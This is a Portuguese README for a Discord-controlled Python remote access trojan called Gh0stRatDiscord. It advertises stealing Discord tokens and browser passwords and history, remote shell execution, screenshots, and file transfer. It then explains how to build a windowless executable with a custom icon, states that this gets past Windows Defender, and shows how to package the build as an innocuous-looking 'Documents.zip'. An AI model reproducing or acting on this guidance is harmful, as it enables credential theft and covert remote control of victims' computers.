# Gh0stRatDiscord
Uma ferramenta de administração remota Python que funciona no Discord. Suporta vários comandos de exploração.

<br/>

## Discord Tokens
Devido a uma atualização do cliente pelo Discord em 2022, a maioria dos Token Grabbers não são mais eficazes. No entanto, esta ferramenta foi projetada para quebrar a criptografia atualizada do Discord.

<br/>

## Senhas do navegador
Esta ferramenta é capaz de extrair senhas de navegadores da web contemporâneos.

<br/>

## Lista de Comandos

```text 
help - Help command
ping - Ping command
cwd - Get current working directory
cd <path> - Change directory
ls - List directory
download <file> - Download file
upload <link> - Upload file
shell <ps> - Execute shell command
run <file> - Run an file
exit - Exit the session
screenshot - Take a screenshot
tokens - Get all discord tokens
shutdown - Shutdown the computer
restart - Restart the computer
passwords - Extracts all browser passwords
history - Extracts all browser history
```

<br/>

# Configuração de pacotes
### Instalando pacotes necessários
```python
pip install -r requirements.txt
```

<br/>

# Bot do Discord
* Criar BOT
* Configurar BOT
* Adicionar BOT

<br/>

# Configuração RAT
```python
guild_id = ""  # ID do canal/servidor do Discord
token = ""     # Token do Bot do Discord
```

<br/>

# Compilando em um executável (.exe)
Para converter um arquivo Python em um executável uma opção é utilizar o cx_Freeze. O cx_Freeze é uma ferramenta semelhante ao PyInstaller que pode ser usada para criar executáveis a partir de scripts Python.

<br/>

## 1 - Instalação do cx_Freeze:
você pode instalá-lo usando pip
```bash
pip install cx_Freeze
```
<br/>

## 2 - Criando um script de configuração:
Crie um arquivo chamado <code>setup.py</code> com as informações de configuração para o cx_Freeze. Aqui está um exemplo básico de um arquivo <code>setup.py</code>:
```bash
# script setup.py
from cx_Freeze import setup, Executable

# Nome e Descrição do executável.
nome_executavel = "MeuExecutavel"
descricao_executavel = "Descrição do seu executável"

# icon = define o icone do executável.
# base = Serve para criar um executável sem console.
executables = [Executable("main.py", base="Win32GUI", icon="icone.ico")]

setup(
    name=nome_executavel,
    version="1.0",
    description=descricao_executavel,
    executables=executables,
)
```

<br/>

```
# Certifique-se de passar o caminho do arquivo do ícone que você deseja usar. caso esteja em outra pasta:

icon="C:\Pasta1\Pasta2\icone.ico"
```

<br/>

## 2 - Execute o cx_Freeze compilando em um executável:
```bash
python setup.py build
```
### Usando cx_Freeze seu malwer passa pelo navegador e passa pelo Windows Defender na instalação e execução do (.exe)

<br/>

# Compilando em um arquivo (.zip)
```powershell
Compress-Archive -Path 'build' -DestinationPath 'C:\Users\***NAMEUSER***\Downloads\Documents.zip'
```
